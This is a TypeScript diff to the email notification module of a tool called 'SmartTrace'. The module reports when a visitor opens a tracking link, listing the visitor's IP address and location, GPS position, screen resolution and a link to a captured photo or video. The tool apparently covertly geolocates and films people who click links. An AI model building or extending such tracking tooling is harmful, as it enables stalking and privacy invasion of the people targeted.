@@ -1,4 +1,5 @@
 import nodemailer from "nodemailer";
+import { getSmtpSetting } from "./db";
 
 export async function sendCaptureNotification(data: {
   linkId: string;
@@ -7,12 +8,28 @@ export async function sendCaptureNotification(data: {
   resolution: string;
   filePath: string;
   createdAt: Date;
+  userId?: number | null;
 }) {
-  const host = process.env.SMTP_HOST;
-  const port = Number(process.env.SMTP_PORT || 465);
-  const user = process.env.SMTP_USER;
-  const pass = process.env.SMTP_PASS;
-  const recipient = process.env.NOTIFICATION_EMAIL || user;
+  let host = process.env.SMTP_HOST;
+  let port = Number(process.env.SMTP_PORT || 465);
+  let user = process.env.SMTP_USER;
+  let pass = process.env.SMTP_PASS;
+  let recipient = process.env.NOTIFICATION_EMAIL || user;
+  let subjectTemplate = "";
+  let htmlTemplate = "";
+
+  if (data.userId) {
+    const userSetting = await getSmtpSetting(data.userId);
+    if (userSetting) {
+      host = userSetting.host;
+      port = userSetting.port;
+      user = userSetting.user;
+      pass = userSetting.pass;
+      recipient = userSetting.recipient;
+      subjectTemplate = userSetting.emailSubjectTemplate || "";
+      htmlTemplate = userSetting.emailHtmlTemplate || "";
+    }
+  }
 
   if (!host || !user || !pass) {
     console.warn("[SMTP] SMTP not configured. Skipping email notification.");
@@ -23,63 +40,77 @@ export async function sendCaptureNotification(data: {
     const transporter = nodemailer.createTransport({
       host,
       port,
-      secure: port === 465, // true for 465, false for other ports
-      auth: {
-        user,
-        pass,
-      },
+      secure: port === 465,
+      auth: { user, pass },
     });
 
     const isVideo = data.filePath.endsWith(".webm") || data.filePath.endsWith(".mp4");
-    const mediaType = isVideo ? "Kurzvideo" : "Foto";
+    const mediaType = isVideo ? "Kurzvideo / Video" : "Foto / Photo";
+
+    const defaultSubject = `[SmartTrace] 新访客捕获 - 追踪ID: ${data.linkId}`;
+    const defaultHtml = `
+      <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333;">
+        <div style="max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
+          <h2 style="color: #4f46e5; margin-top: 0;">SmartTrace 访客通知</h2>
+          <p>检测到有新的访客访问了您的追踪链接：</p>
+          <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 140px;">追踪编号:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; color: #4f46e5;">{linkId}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">IP 地址与属地:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">{ip}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">GPS 定位:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">{gps}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">屏幕分辨率:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">{resolution}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">媒体类型:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">{mediaType}</td>
+            </tr>
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">捕获时间:</td>
+              <td style="padding: 10px; border-bottom: 1px solid #eee;">{createdAt}</td>
+            </tr>
+          </table>
+          <p style="margin-top: 20px;">
+            <a href="{filePath}" target="_blank" style="background: #4f46e5; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">查看媒体文件</a>
+          </p>
+        </div>
+      </div>
+    `;
+
+    const formatString = (str: string) => {
+      return str
+        .replace(/{linkId}/g, data.linkId)
+        .replace(/{ip}/g, data.ip)
+        .replace(/{gps}/g, data.gps)
+        .replace(/{resolution}/g, data.resolution)
+        .replace(/{mediaType}/g, mediaType)
+        .replace(/{createdAt}/g, new Date(data.createdAt).toLocaleString())
+        .replace(/{filePath}/g, data.filePath);
+    };
+
+    const subject = subjectTemplate ? formatString(subjectTemplate) : defaultSubject;
+    const html = htmlTemplate ? formatString(htmlTemplate) : formatString(defaultHtml);
 
     const mailOptions = {
-      from: `"SmartTrace System" <${user}>`,
+      from: `"SmartTrace Vault" <${user}>`,
       to: recipient,
-      subject: `[Neuer Besucher] Tracking-ID: ${data.linkId}`,
-      html: `
-        <div style="font-family: Arial, sans-serif; padding: 20px; background-color: #f4f6f9; color: #333;">
-          <div style="max-width: 600px; margin: 0 auto; background: #ffffff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
-            <h2 style="color: #4f46e5; margin-top: 0;">Neue Besucher-Erfassung</h2>
-            <p>Es wurde eine neue Aufnahme über den Tracking-Link erfasst:</p>
-            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold; width: 140px;">Tracking ID:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; color: #4f46e5;">${data.linkId}</td>
-              </tr>
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">IP-Adresse:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.ip}</td>
-              </tr>
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">GPS-Standort:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.gps}</td>
-              </tr>
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Auflösung:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee;">${data.resolution}</td>
-              </tr>
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Medientyp:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee;">${mediaType}</td>
-              </tr>
-              <tr>
-                <td style="padding: 10px; border-bottom: 1px solid #eee; font-weight: bold;">Erfassungszeit:</td>
-                <td style="padding: 10px; border-bottom: 1px solid #eee;">${new Date(data.createdAt).toLocaleString()}</td>
-              </tr>
-            </table>
-            <p style="margin-top: 20px;">
-              <a href="${data.filePath}" target="_blank" style="background: #4f46e5; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">Aufnahme ansehen</a>
-            </p>
-          </div>
-        </div>
-      `,
+      subject,
+      html,
     };
 
     await transporter.sendMail(mailOptions);
-    console.log(`[SMTP] E-Mail-Benachrichtigung erfolgreich gesendet an ${recipient}`);
+    console.log(`[SMTP] Notification sent successfully to ${recipient}`);
   } catch (error) {
-    console.error("[SMTP] Fehler beim Senden der E-Mail:", error);
+    console.error("[SMTP] Failed to send notification email:", error);
   }
 }
 
